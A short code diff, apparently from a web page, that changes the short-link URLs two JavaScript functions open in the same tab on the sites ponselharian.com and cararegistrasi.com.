@@ -19,7 +19,7 @@
    window.open("https://cararegistrasi.com/6DI142MLg","_self");
    }
    function MainMAS() {
-   window.open("https://ponselharian.com/h57f3AS3j1c","_self");
+   window.open("https://ponselharian.com/MxEBfQTQ","_self");
    }
    
    function MhAa() {
@@ -29,7 +29,7 @@
    window.open("https://cararegistrasi.com/UYfeD77zWDvu","_self");
    }
    function MainMA() {
-   window.open("https://ponselharian.com/z6iZt","_self");
+   window.open("https://ponselharian.com/EPRvIL","_self");
    }
    
    function FtrMhAa() {
